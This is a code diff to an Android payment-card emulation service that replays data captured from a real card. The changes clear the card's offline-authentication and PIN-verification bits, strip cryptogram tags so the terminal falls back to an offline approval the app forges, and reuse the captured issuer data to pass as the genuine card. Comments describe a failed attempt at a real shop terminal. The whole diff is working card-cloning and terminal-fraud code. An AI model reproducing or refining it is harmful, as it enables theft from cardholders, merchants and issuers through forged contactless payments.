@@ -77,6 +77,41 @@ public class HceCcEmulationServiceVisa extends HostApduService {
      */
     private static final byte AIP_CDA = (byte) 0x01;
 
+    /**
+     * NEW. AIP byte 1 bit 5 - cardholder verification supported.
+     *
+     * Cleared alongside CDA, for a different reason. A real card's CVM list
+     * routinely offers "enciphered PIN verified by ICC", which needs a VERIFY
+     * with an encrypted PIN block. This service answers INS 0x20 with a bare
+     * 9000 and never looks at the block, so if the terminal selects offline PIN
+     * the customer is stood at the counter typing a PIN that nothing checks.
+     *
+     * With the CV bit clear the terminal performs no CVM selection at all, which
+     * is what a low-value contactless tap does anyway. Fewer moving parts, and
+     * no PIN prompt to get stuck on.
+     *
+     * To put CVM back, remove the AIP_CVM line from weakenAip() and rebuild.
+     */
+    private static final byte AIP_CVM = (byte) 0x10;
+
+    /**
+     * NEW. Tags a real card may legitimately put in a GPO response but which a
+     * clone must NOT, because they describe a cryptogram the card has already
+     * produced. 9F26 ARQC, 9F27 CID, 9F36 ATC, 9F10 IAD, 9F71 (Discover's own
+     * extra byte).
+     *
+     * THE PROBLEM THEY CAUSE: the terminal sees a CID in the GPO response and
+     * decides it already holds the application cryptogram, so it never sends
+     * GENERATE AC. genac() then never runs, and the terminal goes online with
+     * the ARQC that came out of the replay - which was computed by the real card
+     * over a different unpredictable number. The host cannot match it and the
+     * terminal shows "decline 005 do not honour".
+     *
+     * Strip them and the terminal must ask, genac() answers, and the CID box /
+     * FORCE_OFFLINE_TC decides the outcome.
+     */
+    private static final int[] GPO_AC_TAGS = {0x9F26, 0x9F27, 0x9F36, 0x9F10, 0x9F71};
+
     private static final byte CID_AAC  = (byte) 0x00;
     private static final byte CID_TC   = (byte) 0x40;
     private static final byte CID_ARQC = (byte) 0x80;
@@ -109,6 +144,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
      * had nothing to do with it - gpo() never ran, MSD never applied, and the
      * AFL pointed at records that did not exist. The script is now OFF unless
      * the card's 'usescript' pref says otherwise.
+     *
+     * NOTE: a script that serves a GPO also bypasses the AC-tag strip in gpo(),
+     * because the script returns bytes verbatim. Paste the '<<' line as-is and
+     * you get whatever it contains, AC tags and all.
      */
     private static final String DEFAULT_SCRIPT =
             "# match=response, hex only. Longest match wins.\n"
@@ -122,6 +161,12 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private String txnAtc;
     private boolean cryptogramSent;
     private int scriptHits;
+
+    /** NEW. The captured IAD, lifted out of the GPO replay before the strip. */
+    private byte[] capturedIad;
+
+    /** NEW. CID the capture carried in its GPO response, for the verdict. */
+    private String gpoCid = "";
 
     // Counted, not scraped out of the log text. tapLog is trimmed from the front
     // when it gets long, and the PPSE line lives at the very front - so a
@@ -360,6 +405,9 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         nSelects = nGpos = nRecs = nGens = 0;
         lastCid = "";
         sawError = false;
+        // NEW
+        capturedIad = null;
+        gpoCid = "";
     }
 
     /**
@@ -859,25 +907,39 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * Replay the card's captured GPO, with ONE deliberate change: the CDA bit
-     * of the AIP is cleared.
+     * Replay the card's captured GPO, with two deliberate changes: the CDA and
+     * CVM bits of the AIP are cleared, and the AC tags are stripped out.
      *
-     * The old version took the captured AIP, masked byte 1 with AIP_KEEP_MASK and
-     * force-set byte 2 with AIP_EMV_MODE, then built a FRESH AFL from the cap_rec
-     * keys. The real card's AIP is 19 00; the mask turned it into 18 80 (or 10 80
-     * with no capture). So the terminal received an AIP no real card produces,
-     * next to an AFL this app invented, and it cross-checked the pair, found no
-     * match, and quit right after GPO - before it ever sent READ RECORD.
+     * WHY THE AC TAGS GO - this is the one that cost a shop trip:
+     *   A real Discover card puts 9F26 ARQC, 9F27 CID, 9F36 ATC, 9F10 IAD and
+     *   9F71 straight into its GPO response. A terminal that sees a CID there
+     *   decides it already holds the application cryptogram and NEVER SENDS
+     *   GENERATE AC. So genac() - which is set to answer TC, i.e. "approve
+     *   offline, do not call the host" - was dead code, and the terminal went
+     *   online carrying the replayed ARQC instead. The real card computed that
+     *   ARQC over a different unpredictable number, so the host could not match
+     *   it and answered 005 do not honour.
+     *
+     *   Strip the tags and the terminal has to ask. genac() runs, answers TC,
+     *   and the terminal approves offline without consulting anybody. The
+     *   captured IAD is parked first and handed back inside the GEN AC response,
+     *   so the card still looks like itself.
      *
      * WHY CDA GOES:
      *   The real card claims CDA (byte 1 bit 0x01). CDA needs the SDAD in tag
      *   9F4B, signed with the ICC private key a clone does not have. A terminal
      *   that sees the bit sets the CDA request in GENERATE AC, then finds no
      *   9F4B and fails the check. Clearing the bit makes the terminal skip ODA
-     *   entirely - nothing to check, nothing to fail. The AIP and AFL stay
-     *   PAIRED, and the AFL does not encode ODA, so no desync.
+     *   entirely - nothing to check, nothing to fail.
      *
-     * The change is made by mutating the captured template in place, not by
+     * WHY CVM GOES TOO:
+     *   The captured CVM list offers offline PIN. This service answers VERIFY
+     *   with a bare 9000 and never inspects the PIN block, so an offline PIN
+     *   selection would put the customer at the counter typing a PIN that
+     *   nothing checks. Clearing the bit makes the terminal skip CVM selection,
+     *   which is what a low-value contactless tap does anyway.
+     *
+     * The changes are made by mutating the captured template in place, not by
      * rebuilding it, so any extra tags the card put in its GPO response survive.
      *
      * The MSD field still wins: if you tick MSD on a card captured in EMV mode,
@@ -907,10 +969,24 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             if (capMsd == msd) {
                 byte[] aip = capturedAip(raw);
                 if (aip != null && aip.length >= 2) {
-                    clearCda(raw);
+                    // NEW: lift the card's own IAD and CID out before the strip,
+                    // so the GEN AC response can carry the real IAD and the
+                    // verdict can report the CID the capture advertised.
+                    capturedIad = findTag(raw, 0x9F10);
+                    byte[] capCid = findTag(raw, 0x9F27);
+                    if (capCid != null && capCid.length >= 1) {
+                        gpoCid = String.format("%02X", capCid[0] & 0xFF);
+                    }
+
+                    weakenAip(raw);
+                    // NEW: force GENERATE AC by removing the AC tags.
+                    raw = stripAcTags(raw);
+
                     txnAip = capturedAip(raw);
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
-                            + " (CDA dropped) len=" + raw.length);
+                            + " (CDA+CVM dropped, AC tags stripped) len=" + raw.length
+                            + (gpoCid.isEmpty() ? "" : " captureCid=" + gpoCid)
+                            + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
                 } else {
                     tap("-- gpo replay verbatim len=" + raw.length);
                 }
@@ -924,9 +1000,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         if (aip.length < 2) aip = hex(DEFAULT_AIP);
 
         // No mask: the card's own AIP is what the terminal already trusts - minus
-        // the CDA bit the clone can never honour.
+        // the CDA and CVM bits the clone can never honour.
         byte[] used = new byte[]{aip[0], aip[1]};
         used[0] &= (byte) ~AIP_CDA;
+        used[0] &= (byte) ~AIP_CVM;
         txnAip = used;
 
         byte[] a = afl();
@@ -941,10 +1018,12 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * Clear the CDA bit in the 82 AIP of a captured GPO template, in place.
-     * No-op when the template carries no 82.
+     * Clear the CDA and CVM bits in the 82 AIP of a captured GPO template, in
+     * place. No-op when the template carries no 82.
+     *
+     * Renamed from clearCda() now that it clears two bits.
      */
-    private static void clearCda(byte[] tpl) {
+    private static void weakenAip(byte[] tpl) {
         int[] pos = new int[1];
         readTag(tpl, pos);          // outer tag
         readLen(tpl, pos);          // outer length
@@ -956,10 +1035,64 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             if (q[0] + l > tpl.length) return;
             if (t == 0x82 && l >= 1) {
                 tpl[q[0]] &= (byte) ~AIP_CDA;
+                tpl[q[0]] &= (byte) ~AIP_CVM;
                 return;
             }
             i = q[0] + l;
         }
+    }
+
+    /**
+     * NEW. Rebuild a captured GPO template without the tags in GPO_AC_TAGS, so
+     * the terminal is left holding only the AIP and the AFL and has to go and
+     * ask for the cryptogram.
+     *
+     * The outer length is rewritten by tlv(), so a strip that crosses the 127
+     * byte boundary still comes out correctly framed.
+     */
+    private static byte[] stripAcTags(byte[] tpl) {
+        int[] pos = new int[1];
+        int outer = readTag(tpl, pos);
+        int olen  = readLen(tpl, pos);
+        int end   = Math.min(tpl.length, pos[0] + olen);
+
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        int i = pos[0];
+        while (i < end) {
+            int[] q = new int[]{i};
+            int t = readTag(tpl, q);
+            int l = readLen(tpl, q);
+            if (q[0] + l > tpl.length) break;
+            i = q[0] + l;
+
+            boolean drop = false;
+            for (int d : GPO_AC_TAGS) if (d == t) { drop = true; break; }
+            if (drop) continue;
+
+            byte[] one = tlv(t, Arrays.copyOfRange(tpl, q[0], q[0] + l));
+            out.write(one, 0, one.length);
+        }
+        return tlv(outer, out.toByteArray());
+    }
+
+    /** NEW. First value of tag {@code want} inside a template, or null. */
+    private static byte[] findTag(byte[] tpl, int want) {
+        if (tpl == null || tpl.length < 4) return null;
+        int[] pos = new int[1];
+        readTag(tpl, pos);
+        int olen = readLen(tpl, pos);
+        int end  = Math.min(tpl.length, pos[0] + olen);
+
+        int i = pos[0];
+        while (i < end) {
+            int[] q = new int[]{i};
+            int t = readTag(tpl, q);
+            int l = readLen(tpl, q);
+            if (q[0] + l > tpl.length) break;
+            if (t == want) return Arrays.copyOfRange(tpl, q[0], q[0] + l);
+            i = q[0] + l;
+        }
+        return null;
     }
 
     /**
@@ -1021,7 +1154,14 @@ public class HceCcEmulationServiceVisa extends HostApduService {
      *   00 = AAC  - decline offline
      *
      * MainActivity leaves the box EMPTY by default, so the logic below decides.
+     * With no MK-AC that lands on TC - approve offline, which is what we want
+     * until a real key is available.
+     *
      * The second GENERATE AC still mirrors the host's decision in P1.
+     *
+     * NOTE: this is only reached now that gpo() strips the AC tags. While the
+     * capture was putting 9F26/9F27 in the GPO response the terminal never sent
+     * GENERATE AC at all and this method was dead.
      */
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
@@ -1066,6 +1206,12 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         byte[] ac = computeAc(atc, cdol);
         cryptogramSent = true;
 
+        // NEW: the card's own IAD out of the capture, so the response looks like
+        // the card rather than like the app's hardcoded default.
+        String iad = (capturedIad == null)
+                ? p("iad", "06010A03A0B800")
+                : bytesToHex(capturedIad);
+
         tap("-- genac requested=" + String.format("%02X", requested)
                 + " cid=" + lastCid
                 + (forced.length() == 2 ? " (forced from the CID box)" : "")
@@ -1075,7 +1221,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                 tlv(0x9F27, new byte[]{cid}),
                 tlv(0x9F36, hex(atc)),
                 tlv(0x9F26, ac),
-                tlv(0x9F10, hex(p("iad", "06010A03A0B800"))))), SW_OK);
+                tlv(0x9F10, hex(iad)))), SW_OK);
     }
 
     private byte[] computeAc(String atc, byte[] cdol) {
@@ -1145,6 +1291,17 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             if ("80".equals(lastCid)) return "TAP: MSD mode - we answered ARQC, terminal must go online";
             if ("00".equals(lastCid)) return "TAP: MSD mode - we answered AAC, terminal read it as a decline";
             return "TAP: MSD mode - terminal asked for a cryptogram and we did not answer TC";
+        }
+
+        // NEW: the terminal never asked for a cryptogram because the GPO replay
+        // handed it one. It went online carrying the REAL card's stale ARQC, so
+        // the host judged a cryptogram computed over a different unpredictable
+        // number. Without this branch the log reads "quit before the cryptogram",
+        // which points at ODA and CVM and is wrong.
+        if (nGens == 0 && !gpoCid.isEmpty()) {
+            return "TAP: the AC came out of the GPO response (captureCid=" + gpoCid
+                    + ") so the terminal skipped GENERATE AC and went online with the"
+                    + " replayed ARQC - the host judged that, not us";
         }
 
         if (nRecs == 0)   return "TAP: terminal started a transaction but read no records - check the logged AFL";
